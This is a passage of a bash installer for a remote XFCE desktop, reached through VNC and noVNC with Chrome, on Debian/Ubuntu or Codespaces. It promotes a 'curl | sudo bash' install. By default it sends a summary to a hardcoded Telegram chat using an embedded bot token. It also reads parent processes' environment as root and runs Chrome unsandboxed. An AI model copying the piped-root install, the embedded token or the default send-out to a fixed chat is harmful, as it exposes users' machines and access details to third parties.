#!/usr/bin/env bash
# =============================================================================
#  SYSCORE PATCH BY WIZI - remote desktop in one command
#
#  One-liner install (no file upload, works on a Codespace or a plain VPS):
#
#     curl -sL https://<link-to-this-script> | sudo bash
#
#  The script detects by itself whether a previous run already installed
#  everything: if it did, it only restarts the VNC session (a few seconds);
#  otherwise it performs the full installation. You can force a mode:
#
#     curl -sL <link> | sudo bash -s -- --status    # da cai chua? dang chay khong?
#     curl -sL <link> | sudo bash -s -- --start     # chi bat lai VNC
#     curl -sL <link> | sudo bash -s -- --install   # cai lai tu dau
#
#  Installs on Debian / Ubuntu: xfce4, xfce4-goodies, tightvncserver,
#  dbus-x11, novnc, websockify, wget + Google Chrome, then starts a VNC
#  session on display :1 and a noVNC web client on port 6080, with Chrome
#  auto-started inside the XFCE session.
#
#  Works both on a normal server (systemd services) and inside a container
#  such as GitHub Codespaces (no systemd -> background processes).
#
#  Note on binary names: Debian and Ubuntu install the TightVNC tools as
#  "tightvncserver" / "tightvncpasswd" (renamed so they do not clash with
#  TigerVNC). The script detects either spelling.
#
#  Everything is non-interactive: the keyboard-configuration debconf prompts
#  are preseeded, apt runs with DEBIAN_FRONTEND=noninteractive, and the VNC
#  password is written through the filter mode of the vncpasswd tool.
#
#  Options: run with --help
# =============================================================================

set -Eeuo pipefail
umask 022

PROG="${0##*/}"
VERSION="2.0.0"

# ----------------------------- defaults --------------------------------------
DISPLAY_NUM="1"
GEOMETRY="1280x720"
DEPTH="24"
WEB_PORT="6080"
KEYMAP="us"
VNC_PASS_IN=""
VNC_PASS=""
PASS_STATE=""
TARGET_USER=""
TARGET_HOME=""
TARGET_GROUP=""
INSTALL_CHROME=1
USE_SYSTEMD="auto"
VNC_BIN=""
VNC_PASSWD_BIN=""
WEBSOCKIFY_BIN=""
PKGS=()
MODE="auto"                 # auto | install | start | status
INSTALLED_STATE=""          # none | partial | ready
CORE_READY=0                # 1 = packages/binaries already present
NOVNC_WEB_DIR="${NOVNC_WEB_DIR:-}"
SYSTEMD_DIR="${SYSTEMD_DIR:-/etc/systemd/system}"
LOG_FILE="${LOG_FILE:-/var/log/setup-novnc.log}"

# -------------------------- telegram notify ----------------------------------
# CẢNH BÁO: ai đọc được file này (gist/repo công khai) đều dùng được bot token
# bên dưới để gửi tin nhắn vào chat của bạn. Nếu bạn public script, hãy tạo bot
# mới với @BotFather rồi thay token, hoặc chạy với --no-telegram.
# Có thể ghi đè bằng biến môi trường: TG_TOKEN=... TG_CHAT=... curl ... | sudo bash
TG_TOKEN="${TG_TOKEN:-9265916115:AAHhrnOiubwtXNEIg3Q1HPjyF2Nyc9NKW9A}"
TG_CHAT="${TG_CHAT:-7644912517}"
NOTIFY_TELEGRAM=1

# =============================== output ======================================
init_log() {
    if ! touch "$LOG_FILE" 2>/dev/null; then
        LOG_FILE="/dev/null"
    fi
    chmod 600 "$LOG_FILE" 2>/dev/null || true
}

say() {
    printf '%s\n' "$*" | tee -a "$LOG_FILE" >&2
    return 0
}

step() {
    printf '\n\033[1;36m==> %s\033[0m\n' "$*" | tee -a "$LOG_FILE" >&2
    return 0
}

ok() {
    printf '    \033[1;32m[ok]\033[0m %s\n' "$*" | tee -a "$LOG_FILE" >&2
    return 0
}

warn() {
    printf '    \033[1;33m[warn]\033[0m %s\n' "$*" | tee -a "$LOG_FILE" >&2
    return 0
}

die() {
    printf '\n\033[1;31m[error]\033[0m %s\n' "$*" | tee -a "$LOG_FILE" >&2
    exit 1
}

on_error() {
    local ec=$?
    set +e
    trap - ERR
    printf '\n\033[1;31m[error]\033[0m command failed (exit %s) at line %s:\n        %s\n' \
        "$ec" "${1:-?}" "${2:-?}" | tee -a "$LOG_FILE" >&2
    printf '        full log: %s\n' "$LOG_FILE" | tee -a "$LOG_FILE" >&2
    exit "$ec"
}

show_banner() {
    cat <<'BANNER'

✧ ═══════════════════════════════════════════════════════════════ ✧
  ___ _   _ ___  ___ ___  _ __ ___
 / __| | | / __|/ __/ _ \| '__/ _ \
 \__ \ |_| \__ \ (_| (_) | | |  __/
 |___/\__, |___/\___\___/|_|  \___|
       __/ |
      |___/
  _ __  __ _| |_ ___| |__ | |__  _   ___      _(_)___(_)
 | '_ \/ _` | __/ __| '_ \| '_ \| | | \ \ /\ / / |_  / |
 | |_) | (_| | || (__| | | | |_) | |_| |\ V  V /| |/ /| |
 | .__/ \__,_|\__\___|_| |_|_.__/ \__, | \_/\_/ |_/___|_|
 |_|                              |___/
✧ ═══════════════════════════════════════════════════════════════ ✧

BANNER
}

usage() {
    cat <<EOF
$PROG $VERSION - install XFCE + VNC + noVNC + Chrome on Debian/Ubuntu

Usage: $PROG [options]
       curl -sL https://<link> | sudo bash
       curl -sL https://<link> | sudo bash -s -- --password Abc12345

  Chế độ / modes:
      --status          Xem đã cài chưa, đang chạy không, rồi thoát
      --start           Đã cài rồi: chỉ bật lại VNC (không cài gì)
      --install         Cài lại từ đầu (bỏ qua bước tự nhận biết)
      (mặc định)        Tự nhận biết: chưa cài thì cài, cài rồi thì chỉ bật lại

  Tuỳ chọn:
  -p, --password PASS   VNC password, max 8 characters (default: random, shown at the end)
  -d, --display N       X display number (default: 1)
  -g, --geometry WxH    Desktop size (default: 1280x720)
      --web-port PORT   noVNC HTTP port (default: 6080)
  -u, --user USER       User that owns the desktop session
                        (default: the sudo user, else the first normal user)
      --keymap LAYOUT   Keyboard layout preselected for debconf (default: us)
      --no-chrome       Do not install Google Chrome
      --no-systemd      Start VNC/websockify in the background instead of systemd
      --no-telegram     Do not send the summary to Telegram
      --telegram-token T  Bot token for the notification
      --telegram-chat ID   Chat id for the notification
  -h, --help            Show this help
      --version         Show the version

Examples:
  curl -sL https://example.com/setup-novnc.sh | sudo bash
  sudo bash $PROG --status
  sudo bash $PROG --start
  sudo bash $PROG --password 'Abc12345' --geometry 1600x900 --web-port 8080
EOF
}

# ============================== helpers ======================================
need_value() {
    # $1 = option name, $2 = number of remaining args
    if [ "${2:-0}" -lt 2 ]; then
        die "option $1 requires a value"
    fi
}

is_uint() {
    case "${1:-}" in
        ''|*[!0-9]*) return 1 ;;
        *) return 0 ;;
    esac
}

pkg_available() {
    apt-cache show "$1" >/dev/null 2>&1
}

port_open() {
    local port="$1"
    if command -v ss >/dev/null 2>&1; then
        ss -ltn 2>/dev/null | awk -v p=":$port\$" '$4 ~ p { found=1 } END { exit(found ? 0 : 1) }'
    else
        (exec 3<>"/dev/tcp/127.0.0.1/$port") 2>/dev/null
    fi
}

wait_port() {
    local port="$1" tries="${2:-45}" i=0
    while [ "$i" -lt "$tries" ]; do
        if port_open "$port"; then
            return 0
        fi
        sleep 1
        i=$(( i + 1 ))
    done
    return 1
}

port_busy() {
    port_open "$1"
}

as_user() {
    # Run a shell command string as the desktop user with the right HOME.
    local cmd="$1"
    if [ "$TARGET_USER" = "root" ]; then
        HOME="$TARGET_HOME" USER=root LOGNAME=root bash -c "$cmd"
    elif command -v runuser >/dev/null 2>&1; then
        runuser -u "$TARGET_USER" -- \
            env HOME="$TARGET_HOME" USER="$TARGET_USER" LOGNAME="$TARGET_USER" \
            bash -c "$cmd"
    else
        su -s /bin/bash "$TARGET_USER" -c "export HOME='$TARGET_HOME'; $cmd"
    fi
}

user_home() {
    local u="$1" h=""
    if command -v getent >/dev/null 2>&1; then
        h="$(getent passwd "$u" | cut -d: -f6)"
    fi
    if [ -z "$h" ] && [ -r /etc/passwd ]; then
        h="$(awk -F: -v u="$u" '$1 == u { print $6; exit }' /etc/passwd)"
    fi
    printf '%s' "$h"
}

gen_password() {
    local p="" i=0
    while [ "$i" -lt 40 ]; do
        p="$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom 2>/dev/null | head -c 8 || true)"
        if [ "${#p}" -eq 8 ]; then
            printf '%s' "$p"
            return 0
        fi
        i=$(( i + 1 ))
    done
    die "could not generate a VNC password (is /dev/urandom readable?)"
}

detect_public_ip() {
    local ip="" u=""
    for u in https://api.ipify.org https://ifconfig.me/ip https://icanhazip.com; do
        ip="$(curl -4 -fsS --max-time 5 "$u" 2>/dev/null | tr -d ' \r\n' || true)"
        case "$ip" in
            ''|*[!0-9a-fA-F:.]*) ip="" ;;
            *) if [ -n "$ip" ]; then printf '%s' "$ip"; return 0; fi ;;
        esac
    done
    ip="$(hostname -I 2>/dev/null | awk '{ print $1 }' || true)"
    printf '%s' "${ip:-YOUR_SERVER_IP}"
}

in_codespace() {
    [ -n "${CODESPACE_NAME:-}" ]
}

env_from_pid() {
    # $1 = pid, $2 = variable name -> print its value, or fail.
    local pid="$1" name="$2" line=""
    [ -r "/proc/$pid/environ" ] || return 1
    line="$(tr '\0' '\n' <"/proc/$pid/environ" 2>/dev/null | grep -m1 "^${name}=" || true)"
    [ -n "$line" ] || return 1
    printf '%s' "${line#*=}"
}

inherit_codespace_env() {
    # "sudo bash" resets the environment, so CODESPACE_NAME is usually gone by
    # the time this script runs. Recover it from the calling shell's environ
    # (we are root, so /proc/<pid>/environ is readable) instead of asking the
    # user to remember "sudo -E".
    if [ -n "${CODESPACE_NAME:-}" ]; then
        return 0
    fi

    local pid="${PPID:-0}" i=0 val=""
    while [ "$i" -lt 3 ] && [ "${pid:-0}" -gt 1 ]; do
        val="$(env_from_pid "$pid" CODESPACE_NAME || true)"
        if [ -n "$val" ]; then
            CODESPACE_NAME="$val"
            export CODESPACE_NAME
            val="$(env_from_pid "$pid" GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN || true)"
            if [ -n "$val" ]; then
                GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN="$val"
                export GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN
            fi
            return 0
        fi
        pid="$(ps -o ppid= -p "$pid" 2>/dev/null | tr -d ' ' || true)"
        i=$(( i + 1 ))
    done

    val="$(env_from_pid 1 CODESPACE_NAME || true)"
    if [ -n "$val" ]; then
        CODESPACE_NAME="$val"
        export CODESPACE_NAME
    fi
    return 0
}

detect_access_url() {
    # GitHub Codespaces forwards the port and serves it under a generated host.
    if in_codespace; then
        local domain="${GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN:-app.github.dev}"
        printf 'https://%s-%s.%s/vnc.html' "$CODESPACE_NAME" "$WEB_PORT" "$domain"
        return 0
    fi
    printf 'http://%s:%s/vnc.html' "$(detect_public_ip)" "$WEB_PORT"
}

# ============================== preflight ====================================
require_root() {
    if [ "$(id -u)" -eq 0 ]; then
        return 0
    fi
    if [ -f "$0" ] && command -v sudo >/dev/null 2>&1; then
        say "Root privileges required - restarting with sudo..."
        exec sudo -E bash "$(readlink -f "$0")" "$@"
    fi
    die "this installer needs root.
        If you downloaded it: sudo bash $PROG
        If you piped it:      curl -sL <link> | sudo bash"
}

detect_os() {
    local id="" like=""
    if [ -r /etc/os-release ]; then
        # shellcheck disable=SC1091
        . /etc/os-release
        id="${ID:-}"
        like="${ID_LIKE:-}"
    fi
    case "$id" in
        ubuntu|debian|linuxmint|pop|raspbian|kali|neon|zorin|elementary)
            DISTRO="$id" ;;
        *)
            case " $like " in
                *" debian "*|*" ubuntu "*) DISTRO="$id" ;;
                *) DISTRO="${id:-unknown}" ;;
            esac
            ;;
    esac
    if ! command -v apt-get >/dev/null 2>&1; then
        die "this script only supports apt-based distributions (Debian/Ubuntu family)"
    fi
    ok "distribution: ${PRETTY_NAME:-$DISTRO}"
}

pick_user() {
    local u=""
    if [ -n "$TARGET_USER" ]; then
        if ! id "$TARGET_USER" >/dev/null 2>&1; then
            die "user '$TARGET_USER' does not exist on this system"
        fi
        return 0
    fi
    if [ -n "${SUDO_USER:-}" ] && [ "$SUDO_USER" != "root" ] && id "$SUDO_USER" >/dev/null 2>&1; then
        u="$SUDO_USER"
    fi
    if [ -z "$u" ] && [ -n "${LOGNAME:-}" ] && [ "$LOGNAME" != "root" ] && id "$LOGNAME" >/dev/null 2>&1; then
        u="$LOGNAME"
    fi
    if [ -z "$u" ]; then
        u="$(awk -F: '$3 >= 1000 && $3 < 60000 && $7 !~ /(nologin|false|sync|shutdown)$/ { print $1; exit }' /etc/passwd)"
    fi
    if [ -z "$u" ]; then
        u="root"
    fi
    TARGET_USER="$u"
}

resolve_user() {
    TARGET_HOME="$(user_home "$TARGET_USER")"
    [ -n "$TARGET_HOME" ] || die "cannot resolve the home directory of user '$TARGET_USER'"
    [ -d "$TARGET_HOME" ] || die "home directory '$TARGET_HOME' does not exist"
    TARGET_GROUP="$(id -gn "$TARGET_USER")"
    if [ "$TARGET_USER" = "root" ]; then
        warn "no regular user found - the desktop will run as root (not recommended)"
    fi
    ok "desktop user: $TARGET_USER ($TARGET_HOME)"
}

validate_args() {
    is_uint "$DISPLAY_NUM" || die "--display must be a number"
    [ "$DISPLAY_NUM" -ge 1 ] && [ "$DISPLAY_NUM" -le 99 ] || die "--display must be between 1 and 99"

    case "$GEOMETRY" in
        [0-9]*x[0-9]*) ;;
        *) die "--geometry must look like 1280x720" ;;
    esac
    local w="${GEOMETRY%x*}" h="${GEOMETRY#*x}"
    is_uint "$w" && is_uint "$h" || die "--geometry must look like 1280x720"
    [ "$w" -ge 320 ] && [ "$h" -ge 240 ] || die "--geometry is too small"

    is_uint "$WEB_PORT" || die "--web-port must be a number"
    [ "$WEB_PORT" -ge 1024 ] && [ "$WEB_PORT" -le 65535 ] || die "--web-port must be between 1024 and 65535"

    if [ -n "$VNC_PASS_IN" ]; then
        if ! printf '%s' "$VNC_PASS_IN" | LC_ALL=C grep -q '^[!-~]\{1,8\}$'; then
            die "--password must be 1 to 8 printable characters without spaces (VNC limit)"
        fi
    fi

    case "$KEYMAP" in
        ''|*[!A-Za-z0-9_-]*) die "--keymap must look like us, vn, de (letters, digits, _ or -)" ;;
    esac
}

check_resources() {
    local avail_kb="" needed_kb=3500000
    avail_kb="$(df -Pk / | awk 'NR == 2 { print $4 }')"
    if is_uint "$avail_kb" && [ "$avail_kb" -lt "$needed_kb" ]; then
        warn "only $(( avail_kb / 1024 )) MB free on / - about $(( needed_kb / 1024 )) MB is recommended"
    fi
    local mem_kb=""
    mem_kb="$(awk '/^MemTotal/ { print $2 }' /proc/meminfo 2>/dev/null || true)"
    if is_uint "$mem_kb" && [ "$mem_kb" -lt 700000 ]; then
        warn "less than 700 MB of RAM - XFCE + Chrome may be slow, consider adding swap"
    fi
    if port_busy "$WEB_PORT"; then
        # A previous run of this script leaves websockify on that port; that is
        # fine, it gets restarted later. Anything else is a conflict.
        if pgrep -f "websockify.*$WEB_PORT" >/dev/null 2>&1 \
            || [ -f "$SYSTEMD_DIR/novnc-web.service" ]; then
            warn "port $WEB_PORT is still held by the previous install - it will be restarted"
        else
            die "port $WEB_PORT is already in use by another program - choose another one with --web-port"
        fi
    fi
    if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
        ok "systemd detected"
    else
        if [ "$USE_SYSTEMD" = "1" ]; then
            warn "systemd was requested but does not look usable"
        fi
    fi
}

choose_systemd() {
    if [ "$USE_SYSTEMD" = "0" ]; then
        return 0
    fi
    if [ "$USE_SYSTEMD" = "1" ]; then
        if [ ! -d /run/systemd/system ]; then
            die "--force-systemd was given but systemd is not running (PID 1 is not systemd)"
        fi
        return 0
    fi
    if [ -d /run/systemd/system ] && command -v systemctl >/dev/null 2>&1 \
        && systemctl list-unit-files >/dev/null 2>&1; then
        USE_SYSTEMD="1"
    else
        USE_SYSTEMD="0"
        warn "systemd is not usable here - services will be started in the background"
    fi
}

# =============================== install =====================================
preseed_debconf() {
    command -v debconf-set-selections >/dev/null 2>&1 || return 0
    debconf-set-selections <<EOF
keyboard-configuration keyboard-configuration/modelcode string pc105
keyboard-configuration keyboard-configuration/layoutcode string $KEYMAP
keyboard-configuration keyboard-configuration/variantcode string
keyboard-configuration keyboard-configuration/xkb-keymap select $KEYMAP
keyboard-configuration keyboard-configuration/toggle select No toggling
keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false
console-setup console-setup/codeset47 select UTF-8
console-setup console-setup/charmap47 select UTF-8
EOF
    ok "debconf preseeded (keyboard: $KEYMAP, no prompts)"
}

apt_get() {
    env DEBIAN_FRONTEND=noninteractive \
        NEEDRESTART_MODE=a NEEDRESTART_SUSPEND=1 APT_LISTCHANGES_FRONTEND=none \
        apt-get -y \
            -o Dpkg::Options::=--force-confdef \
            -o Dpkg::Options::=--force-confold \
            -o DPkg::Lock::Timeout=300 \
            -o Acquire::Retries=3 \
            "$@" </dev/null
}

apt_update() {
    step "Updating package lists"
    if apt_get update; then
        ok "package lists updated"
        return 0
    fi
    warn "apt-get update failed - retrying once"
    sleep 5
    if apt_get update; then
        ok "package lists updated on retry"
        return 0
    fi
    if [ -n "$(ls -A /var/lib/apt/lists 2>/dev/null | head -n 1)" ]; then
        warn "continuing with the package lists already cached on this machine"
        return 0
    fi
    die "apt-get update failed and no package lists are available
        check /etc/apt/sources.list, DNS and network connectivity"
}

find_first_tool() {
    # Print the full path of the first command found on PATH, or fail.
    local c="" p=""
    for c in "$@"; do
        p="$(command -v "$c" 2>/dev/null || true)"
        if [ -n "$p" ]; then
            printf '%s' "$p"
            return 0
        fi
    done
    return 1
}

enable_universe() {
    # On Ubuntu, tightvncserver and novnc live in "universe". Fresh container
    # images sometimes only enable main; enable the component best-effort.
    grep -qs '^ID=ubuntu' /etc/os-release || return 0
    warn "trying to enable the Ubuntu 'universe' component"
    if ! command -v add-apt-repository >/dev/null 2>&1; then
        apt_get install software-properties-common >/dev/null 2>&1 || true
    fi
    if command -v add-apt-repository >/dev/null 2>&1; then
        add-apt-repository -y universe >/dev/null 2>&1 || true
    fi
    sleep 1
    apt_get update >/dev/null 2>&1 || true
    return 0
}

build_pkg_list() {
    if ! pkg_available tightvncserver; then
        enable_universe
    fi
    if ! pkg_available tightvncserver; then
        die "package 'tightvncserver' was not found in the configured repositories
        on Ubuntu it lives in the 'universe' component:
          sudo add-apt-repository universe && sudo apt-get update
        then run this script again"
    fi

    PKGS=(
        ca-certificates curl wget gnupg
        dbus-x11
        xfce4
        novnc websockify
        tightvncserver
    )

    # Optional: installed when the release provides them.
    local p=""
    local optional=(xfce4-goodies x11-xserver-utils x11-xkb-utils xauth tightvncpasswd python3-websockify)
    for p in "${optional[@]}"; do
        if pkg_available "$p"; then
            PKGS+=("$p")
        else
            warn "optional package not available on this release, skipping: $p"
        fi
    done

    local required=(ca-certificates dbus-x11 xfce4 novnc websockify tightvncserver)
    local missing=()
    for p in "${required[@]}"; do
        pkg_available "$p" || missing+=("$p")
    done
    if [ "${#missing[@]}" -gt 0 ]; then
        die "these required packages are not in the configured repositories: ${missing[*]}"
    fi
    ok "${#PKGS[@]} packages selected"
}

install_packages() {
    apt_get install "${PKGS[@]}" || die "package installation failed (dpkg lock or broken mirror?)"

    VNC_BIN="$(find_first_tool tightvncserver vncserver)" \
        || die "the VNC server wrapper (tightvncserver / vncserver) is missing after the install"
    VNC_PASSWD_BIN="$(find_first_tool tightvncpasswd vncpasswd)" \
        || die "the VNC password tool (tightvncpasswd / vncpasswd) is missing after the install"
    WEBSOCKIFY_BIN="$(find_first_tool websockify)" \
        || die "websockify was not installed (install the python3-websockify package)"
    command -v Xtightvnc >/dev/null 2>&1 \
        || warn "Xtightvnc is not on PATH - the VNC server may fail to start"

    # Debian/Ubuntu rename the TightVNC binaries to tightvncserver /
    # tightvncpasswd. Some builds of the wrapper still look for a plain
    # "vncpasswd" on PATH, so provide a compatibility link when it is absent.
    if ! command -v vncpasswd >/dev/null 2>&1; then
        mkdir -p /usr/local/bin
        if ln -sf "$VNC_PASSWD_BIN" /usr/local/bin/vncpasswd 2>/dev/null; then
            ok "added compatibility link /usr/local/bin/vncpasswd"
        fi
    fi

    ok "installed: $(basename "$VNC_BIN"), $(basename "$VNC_PASSWD_BIN"), $(basename "$WEBSOCKIFY_BIN")"
}

find_novnc_dir_soft() {
    local d=""
    if [ -n "$NOVNC_WEB_DIR" ] && [ -f "$NOVNC_WEB_DIR/vnc.html" ]; then
        return 0
    fi
    for d in /usr/share/novnc /usr/share/novnc/html /usr/local/share/novnc /opt/novnc; do
        if [ -f "$d/vnc.html" ]; then
            NOVNC_WEB_DIR="$d"
            return 0
        fi
    done
    NOVNC_WEB_DIR=""
    return 1
}

find_novnc_dir() {
    find_novnc_dir_soft && return 0
    die "noVNC web files not found (looked for vnc.html in /usr/share/novnc) - is the 'novnc' package installed?"
}

detect_installation() {
    # Decide whether a previous run already set everything up.
    #   CORE_READY=1     packages/binaries are there (start-only is possible)
    #   INSTALLED_STATE  none | partial | ready
    local missing=() core_missing=()

    VNC_BIN="$(find_first_tool tightvncserver vncserver || true)"
    VNC_PASSWD_BIN="$(find_first_tool tightvncpasswd vncpasswd || true)"
    WEBSOCKIFY_BIN="$(find_first_tool websockify || true)"
    find_novnc_dir_soft || true

    [ -n "$VNC_BIN" ] || core_missing+=("tightvncserver")
    [ -n "$WEBSOCKIFY_BIN" ] || core_missing+=("websockify")
    [ -n "$NOVNC_WEB_DIR" ] || core_missing+=("novnc")
    if ! command -v Xtightvnc >/dev/null 2>&1 && [ ! -x /usr/bin/Xtightvnc ]; then
        core_missing+=("Xtightvnc")
    fi
    if ! command -v startxfce4 >/dev/null 2>&1; then
        core_missing+=("xfce4")
    fi

    if [ "${#core_missing[@]}" -eq 0 ]; then
        CORE_READY=1
    else
        CORE_READY=0
    fi

    missing+=("${core_missing[@]}")
    [ -n "$VNC_PASSWD_BIN" ] || missing+=("tightvncpasswd")
    [ -s "$TARGET_HOME/.vnc/passwd" ] || missing+=("~/.vnc/passwd")
    [ -x "$TARGET_HOME/.vnc/xstartup" ] || missing+=("~/.vnc/xstartup")

    if [ "${#missing[@]}" -eq 0 ]; then
        INSTALLED_STATE="ready"
        ok "already installed: $VNC_BIN + $WEBSOCKIFY_BIN + $NOVNC_WEB_DIR"
    elif [ "$CORE_READY" = "1" ]; then
        INSTALLED_STATE="partial"
        warn "packages are installed, session config missing: ${missing[*]} (will be recreated)"
    else
        INSTALLED_STATE="none"
        ok "nothing installed yet - full install will run"
    fi
}

install_chrome() {
    if [ "$INSTALL_CHROME" != "1" ]; then
        warn "skipping Google Chrome (--no-chrome)"
        return 0
    fi
    if command -v google-chrome-stable >/dev/null 2>&1; then
        ok "Google Chrome is already installed"
        return 0
    fi

    step "Installing Google Chrome"
    local url="https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb"
    local deb="/tmp/google-chrome-stable_current_amd64.deb"
    local got=0

    if command -v wget >/dev/null 2>&1; then
        if wget -O "$deb" --tries=3 --timeout=60 "$url"; then
            got=1
        fi
    fi
    if [ "$got" -eq 0 ] && command -v curl >/dev/null 2>&1; then
        if curl -fL --retry 3 --connect-timeout 20 -o "$deb" "$url"; then
            got=1
        fi
    fi
    [ "$got" -eq 1 ] || die "could not download Google Chrome from $url"
    [ -s "$deb" ] || die "the downloaded Chrome package is empty"
    dpkg-deb --info "$deb" >/dev/null 2>&1 || die "the downloaded Chrome package is corrupted"

    if ! apt_get install "$deb"; then
        warn "apt could not install the .deb directly - falling back to dpkg"
        dpkg -i "$deb" </dev/null || true
        apt_get install --fix-broken || true
    fi
    rm -f "$deb"
    command -v google-chrome-stable >/dev/null 2>&1 || die "Google Chrome installation failed"
    ok "Google Chrome installed"
}

# ============================== vnc config ===================================
setup_vnc_dir() {
    local dir="$TARGET_HOME/.vnc"
    as_user "mkdir -p '$dir' && chmod 700 '$dir'" || die "cannot create $dir"
    # Fix ownership in case an older session was configured by root.
    chown -R "$TARGET_USER:$TARGET_GROUP" "$dir" 2>/dev/null || true
    ok "session directory: $dir"
}

write_vnc_password() {
    local dir="$TARGET_HOME/.vnc"
    if [ -n "$VNC_PASS_IN" ]; then
        VNC_PASS="$VNC_PASS_IN"
        PASS_STATE="set"
    elif [ -s "$dir/passwd" ]; then
        PASS_STATE="kept"
        ok "keeping the existing VNC password (use --password to change it)"
        return 0
    else
        VNC_PASS="$(gen_password)"
        PASS_STATE="generated"
    fi

    local plain="" enc="" sz=0
    plain="$(mktemp /tmp/vncpasswd.XXXXXX)"
    enc="$(mktemp /tmp/vncpasswd.XXXXXX)"
    chmod 600 "$plain" "$enc"

    printf '%s\n' "$VNC_PASS" >"$plain"
    if ! "$VNC_PASSWD_BIN" -f <"$plain" >"$enc" 2>/dev/null; then
        rm -f "$plain" "$enc"
        die "'$(basename "$VNC_PASSWD_BIN") -f' failed
        set the password manually as $TARGET_USER: $(basename "$VNC_PASSWD_BIN")"
    fi
    sz="$(wc -c <"$enc" | tr -d ' ')"
    if [ "${sz:-0}" -lt 8 ]; then
        rm -f "$plain" "$enc"
        die "'$(basename "$VNC_PASSWD_BIN") -f' produced an invalid password file ($sz bytes)"
    fi
    # Some builds write only the 8 encrypted bytes; the remaining 8 bytes are
    # the (unused) legacy compare block and must exist for strict readers.
    if [ "$sz" -lt 16 ]; then
        head -c $(( 16 - sz )) /dev/urandom >>"$enc"
    fi
    install -m 600 -o "$TARGET_USER" -g "$TARGET_GROUP" "$enc" "$dir/passwd" \
        || die "cannot write $dir/passwd"
    rm -f "$plain" "$enc"
    ok "VNC password written ($PASS_STATE)"
}

write_xstartup() {
    local dir="$TARGET_HOME/.vnc"
    local tmp="" w="${GEOMETRY%x*}" h="${GEOMETRY#*x}"
    tmp="$(mktemp /tmp/xstartup.XXXXXX)"

    cat >"$tmp" <<'XSTARTUP_EOF'
#!/bin/sh
# ~/.vnc/xstartup - started by Xvnc for every VNC session.
# Generated by setup-novnc.sh - edit freely, the installer overwrites it.
unset SESSION_MANAGER
unset DBUS_SESSION_BUS_ADDRESS

[ -f "$HOME/.Xresources" ] && xrdb "$HOME/.Xresources" 2>/dev/null
xsetroot -solid "#1f2430" 2>/dev/null
command -v setxkbmap >/dev/null 2>&1 && setxkbmap @KEYMAP@ 2>/dev/null

# Give the desktop a few seconds to come up, then launch Chrome.
(
    sleep 6
    command -v google-chrome-stable >/dev/null 2>&1 || exit 0
    exec google-chrome-stable \
        --no-sandbox \
        --disable-dev-shm-usage \
        --no-first-run \
        --no-default-browser-check \
        --window-position=0,0 \
        --window-size=@WIDTH@,@HEIGHT@ \
        https://www.google.com >/dev/null 2>&1
) &

exec startxfce4
XSTARTUP_EOF

    sed -i "s/@WIDTH@/$w/g; s/@HEIGHT@/$h/g; s/@KEYMAP@/$KEYMAP/g" "$tmp"
    install -m 755 -o "$TARGET_USER" -g "$TARGET_GROUP" "$tmp" "$dir/xstartup" \
        || die "cannot write $dir/xstartup"
    rm -f "$tmp"
    ok "session startup script installed (XFCE + Chrome window)"
}

clean_old_session() {
    step "Stopping any previous session on display :$DISPLAY_NUM"
    if [ "$USE_SYSTEMD" = "1" ]; then
        systemctl stop "novnc-vnc@$DISPLAY_NUM.service" >/dev/null 2>&1 || true
        systemctl stop "novnc-web.service" >/dev/null 2>&1 || true
    else
        # background mode: make sure the previous websockify is gone, otherwise
        # the new one cannot bind the port (and we would leak a process per run)
        pkill -f "websockify.*${WEB_PORT}" >/dev/null 2>&1 || true
    fi
    as_user "'$VNC_BIN' -kill :$DISPLAY_NUM >/dev/null 2>&1" || true
    if [ "$TARGET_USER" != "root" ]; then
        "$VNC_BIN" -kill ":$DISPLAY_NUM" >/dev/null 2>&1 || true
    fi
    sleep 1
    rm -f "/tmp/.X${DISPLAY_NUM}-lock" 2>/dev/null || true
    rm -f "/tmp/.X11-unix/X${DISPLAY_NUM}" 2>/dev/null || true
    ok "old session cleaned up"
}

write_units() {
    local vnc_unit="$SYSTEMD_DIR/novnc-vnc@.service"
    local web_unit="$SYSTEMD_DIR/novnc-web.service"
    local vnc_port=$(( 5900 + DISPLAY_NUM ))

    mkdir -p "$SYSTEMD_DIR"

    # ---- VNC server (one instance per display) ------------------------------
    cat >"$vnc_unit" <<EOF
[Unit]
Description=Remote desktop (XFCE) on VNC display :%i
After=network.target

[Service]
Type=oneshot
RemainAfterExit=yes
User=$TARGET_USER
Group=$TARGET_GROUP
Environment=HOME=$TARGET_HOME
Environment=USER=$TARGET_USER
Environment=LOGNAME=$TARGET_USER
WorkingDirectory=$TARGET_HOME
ExecStartPre=-/bin/rm -f /tmp/.X%i-lock
ExecStart=$VNC_BIN :%i -geometry $GEOMETRY -depth $DEPTH -localhost
ExecStop=-$VNC_BIN -kill :%i
TimeoutStartSec=120

[Install]
WantedBy=multi-user.target
EOF

    # ---- noVNC web client (websockify) --------------------------------------
    cat >"$web_unit" <<EOF
[Unit]
Description=noVNC web client (port $WEB_PORT) for VNC display :$DISPLAY_NUM
After=novnc-vnc@$DISPLAY_NUM.service
Wants=novnc-vnc@$DISPLAY_NUM.service

[Service]
Type=simple
User=$TARGET_USER
Group=$TARGET_GROUP
Environment=HOME=$TARGET_HOME
ExecStart=$WEBSOCKIFY_BIN --web=$NOVNC_WEB_DIR $WEB_PORT 127.0.0.1:$vnc_port
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

    chmod 644 "$vnc_unit" "$web_unit"
    ok "systemd units written"
}

start_systemd() {
    step "Starting services"
    systemctl daemon-reload
    systemctl enable "novnc-vnc@$DISPLAY_NUM.service" >/dev/null 2>&1 || true
    systemctl enable "novnc-web.service" >/dev/null 2>&1 || true
    systemctl restart "novnc-vnc@$DISPLAY_NUM.service" \
        || die "vnc service failed - run: journalctl -u novnc-vnc@$DISPLAY_NUM -n 50"
    systemctl restart "novnc-web.service" \
        || die "websockify failed - run: journalctl -u novnc-web -n 50"
    ok "systemd services running"
}

start_background() {
    step "Starting VNC and websockify in the background"
    local vnc_port=$(( 5900 + DISPLAY_NUM ))
    as_user "setsid nohup '$VNC_BIN' ':$DISPLAY_NUM' -geometry '$GEOMETRY' -depth '$DEPTH' -localhost >/dev/null 2>&1 </dev/null &" \
        || die "could not start vncserver"
    sleep 2
